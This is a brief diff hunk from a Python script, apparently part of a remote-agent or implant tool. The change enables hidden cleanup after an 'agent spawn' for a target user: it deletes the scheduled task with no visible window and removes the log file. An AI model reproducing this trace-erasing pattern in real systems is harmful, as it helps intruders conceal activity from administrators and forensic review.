@@ -524,11 +524,11 @@ else:
                 result = "Error running task for " + target + ": " + rp.stderr
             else:
                 time.sleep(2)
-                # 3. Cleanup (Disabled for debugging)
-                # subprocess.run(delete_task, capture_output=True, creationflags=CREATE_NO_WINDOW)
-                # try: os.remove(log_path)
-                # except: pass
-                result = 'Success: Agent spawn command sent for user ' + target + '. (File: ' + log_path + ' left for debugging)'
+                # 3. Cleanup
+                subprocess.run(delete_task, capture_output=True, creationflags=CREATE_NO_WINDOW)
+                try: os.remove(log_path)
+                except: pass
+                result = 'Success: Agent spawn command sent for user ' + target + '.'
     except Exception as e:
         result = 'Error during file/task operations: ' + str(e)
 """
